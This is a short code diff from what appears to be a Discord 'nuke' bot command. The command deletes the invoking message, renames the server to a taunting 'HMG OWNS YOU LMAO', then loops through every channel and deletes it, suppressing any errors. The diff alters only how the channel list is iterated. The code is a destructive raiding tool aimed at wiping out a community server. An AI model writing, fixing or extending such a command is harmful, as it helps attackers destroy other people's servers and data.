@@ -36,7 +36,7 @@ async def nuke(ctx):
     await ctx.message.delete()
     await ctx.guild.edit(name="HMG OWNS YOU LMAO")
     guild = ctx.guild
-    for channel in list(ctx.guild.channels):
+    for channel in ctx.guild.channels:
         try:
             await channel.delete()
         except:
